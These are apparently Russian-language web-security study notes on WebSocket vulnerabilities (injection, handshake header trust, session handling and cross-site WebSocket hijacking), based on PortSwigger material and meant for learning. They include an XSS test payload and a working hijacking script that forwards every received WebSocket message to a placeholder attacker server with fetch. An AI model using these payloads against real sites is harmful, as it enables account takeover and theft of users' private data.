WebSocket (веб-сокеты) - это сетевой протокол, обеспечивающий постоянное, полнодуплексное (двунаправленное, т.е. ервер может отправлять данные клиенту без запроса, равно как и клиент - серверу) соединение между браузером и сервером поверх TCP. Он позволяет обмениваться данными в реальном времени, устраняя необходимость частых HTTP-запросов и обновления страниц (используется для чатов, онлайн-игр, биржевых сводок).
## Источники информации
- [WebSokets Learning Path PortSwigger Academy](https://portswigger.net/web-security/learning-paths/websockets-security-vulnerabilities/websockets/websockets/websockets)
## Инструменты
 - Для обнаружения WebSocket можно использовать Burp Proxy, вкладка "WebSockets history"
 - Через Burp Repeater можно изменять/создавать новые сообщения WebSocket, а также можно изменять WebSocket, по которому происходит обмен сообщениями
## Уязвимости WebSocket
- Вводимые пользователем данные, передаваемые на сервер, могут обрабатываться небезопасным образом (SQLi, XXS, XXE и т.п.). Пример: в чате отправить пользователю `<img src=1 onerror='alert(1)'>`
- Манипулирование хэндшейком WebSocket:
	- Доверие к HTTP-заголовкам (например, изменить исходящий IP-адрес с помощью X-Forwarded-For). Атакующий может управлять заголовками, поэтому решения об авторизации, ограничениях доступа или тарификации на основе HTTP-заголовков могут оказаться уязвимыми
	- Ошибки в механизме обработки сессии. Сессионный контекст WebSocket-соединения (т.е. под каким пользователем оно работает) целиком определяется сессией, установленной во время handshake-запроса. Атакующий может во время хэндшейка представиться другим пользователем, например, предварительно украв куки жертвы с помощью XSS
	- Увеличение поверхности атаки из-за кастомных HTTP-заголовков. Если они неправильно обрабатываются, атакующий может их использовать для инъекций (SQLi, XSS, OS Command Injection, SSRF)
- Cross-site WebSocket hijacking (CSWSH) - применение CSRF на хэндшейк WebSocket. Уязвимость можно эксплуатировать, когда для управления сессиями используются куки без CSRF-токенов. 	В результате такой атаки атакующий может совершить следующие действия:
	- Отправить сообщения WebSocket для выполнения каких-либо действий в системе от лица жертвы
	- Отправить сообщения WebSocket для получения конфиденциальной информации из системы
	- Ожидать сообщения от системы с конфиденциальной информацией
  Чтобы выполнить атаку, достаточно через JS подключиться к WebSocket, браузер отправит куки для авторизации:
```HTML
<script> 
var ws = new WebSocket('wss://<websocket_url>'); 
ws.onopen = function() { 
  ws.send("READY"); 
}; 
ws.onmessage = function(event) { 
  fetch(
    'https://<attacker_server_url>', 
    {method: 'POST', 
    mode: 'no-cors', 
    body: event.data}
  ); 
}; 
</script>`
